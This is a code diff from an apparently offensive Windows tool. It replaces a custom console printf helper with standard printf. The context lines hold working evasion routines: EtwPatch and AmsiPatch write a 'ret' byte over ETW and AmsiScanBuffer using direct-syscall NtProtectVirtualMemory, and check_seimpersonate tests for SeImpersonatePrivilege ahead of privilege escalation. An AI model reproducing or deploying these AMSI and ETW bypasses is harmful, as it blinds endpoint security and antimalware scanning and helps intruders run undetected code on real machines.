@@ -87,74 +87,6 @@ PVOID getSyscallAddr(char* funcName) {
     return NULL;
 }
 
-static int sf_itoa(char* buf, unsigned long long v, int base, int upper) {
-    const char* dig = upper ? "0123456789ABCDEF" : "0123456789abcdef";
-    char tmp[24]; int i = 0;
-    if (v == 0) { buf[0] = '0'; buf[1] = 0; return 1; }
-    while (v) { tmp[i++] = dig[v % base]; v /= base; }
-    for (int j = 0; j < i; j++) buf[j] = tmp[i - 1 - j];
-    buf[i] = 0;
-    return i;
-}
-
-static int sf_format(char* out, size_t sz, const char* fmt, va_list ap) {
-    char* p = out; char* end = out + sz - 1;
-    while (*fmt && p < end) {
-        if (*fmt != '%') { *p++ = *fmt++; continue; }
-        fmt++;
-        switch (*fmt++) {
-        case 's': {
-            const char* s = va_arg(ap, const char*);
-            if (!s) s = "(null)";
-            while (*s && p < end) *p++ = *s++;
-            break;
-        }
-        case 'd': case 'i': {
-            int v = va_arg(ap, int); char tmp[16];
-            if (v < 0) { if (p < end) *p++ = '-'; v = -v; }
-            sf_itoa(tmp, (unsigned)v, 10, 0);
-            for (char* t = tmp; *t && p < end; t++) *p++ = *t;
-            break;
-        }
-        case 'u': {
-            unsigned v = va_arg(ap, unsigned); char tmp[16];
-            sf_itoa(tmp, v, 10, 0);
-            for (char* t = tmp; *t && p < end; t++) *p++ = *t;
-            break;
-        }
-        case 'l':
-            if (*fmt == 'u' || *fmt == 'd') {
-                int sgn = (*fmt == 'd'); fmt++;
-                unsigned long v = va_arg(ap, unsigned long); char tmp[16];
-                if (sgn && (long)v < 0) { if (p < end) *p++ = '-'; v = (unsigned long)(-(long)v); }
-                sf_itoa(tmp, v, 10, 0);
-                for (char* t = tmp; *t && p < end; t++) *p++ = *t;
-            }
-            break;
-        case 'p': case 'X': case 'x': {
-            unsigned long long v = va_arg(ap, unsigned long long); char tmp[20];
-            sf_itoa(tmp, v, 16, *(fmt - 1) == 'X');
-            for (char* t = tmp; *t && p < end; t++) *p++ = *t;
-            break;
-        }
-        case '%': if (p < end) *p++ = '%'; break;
-        default:  if (p < end) *p++ = '?'; break;
-        }
-    }
-    *p = 0;
-    return (int)(p - out);
-}
-
-void con_printf(const char* fmt, ...) {
-    char buf[512];
-    va_list ap; va_start(ap, fmt);
-    sf_format(buf, sizeof(buf), fmt, ap);
-    va_end(ap);
-    DWORD written;
-    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    if (hOut && hOut != INVALID_HANDLE_VALUE)
-        WriteFile(hOut, buf, lstrlenA(buf), &written, NULL);
-}
 
 BOOL EtwPatch() {
     g_ssn = getSSN("NtProtectVirtualMemory");
@@ -172,7 +104,7 @@ BOOL EtwPatch() {
         *(BYTE*)pEtwAddr = 0xC3;
         iNtProtectVirtualMemory(GetCurrentProcess(), &pEtwAddr, &region, old, &old);
         FlushInstructionCache(GetCurrentProcess(), pEtwAddr, 1);
-        con_printf("[x] ETW Patched!\n");
+        printf("[x] ETW Patched!\n");
         return 1;
     }
     return 0;
@@ -181,7 +113,7 @@ BOOL EtwPatch() {
 BOOL AmsiPatch() {
     HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
     if (!hAmsi) {
-        con_printf("[x] AMSI not loaded\n");
+        printf("[x] AMSI not loaded\n");
         return 1;  // silent skip
     }
     PVOID pAddr = manual_procaddress(hAmsi, "AmsiScanBuffer");
@@ -192,7 +124,7 @@ BOOL AmsiPatch() {
         *(BYTE*)pAddr = 0xC3;
         iNtProtectVirtualMemory(GetCurrentProcess(),pAddr, 1, old, &old);
         FlushInstructionCache(GetCurrentProcess(), pAddr, 1);
-        con_printf("[x] AMSI Patched!\n");
+        printf("[x] AMSI Patched!\n");
         return 1;
     }
     return 0;
@@ -231,7 +163,7 @@ BOOL check_seimpersonate() {
             if (ptp->Privileges[i].Luid.LowPart == seimpersonateLuid.LowPart &&
                 ptp->Privileges[i].Luid.HighPart == seimpersonateLuid.HighPart) {
                 if (ptp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED || (ptp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)) {
-                    con_printf("[x] SeImpersonatePrivilege\n");
+                    printf("[x] SeImpersonatePrivilege\n");
                     HeapFree(GetProcessHeap(), 0, ptp);
                     return 1;
                 }
@@ -240,7 +172,7 @@ BOOL check_seimpersonate() {
             }
         }
     }
-    con_printf("[-] ERROR: Missing SeImpersonatePrivilege!\n");
+    printf("[-] ERROR: Missing SeImpersonatePrivilege!\n");
     HeapFree(GetProcessHeap(), 0, ptp);
     return 0;
 }
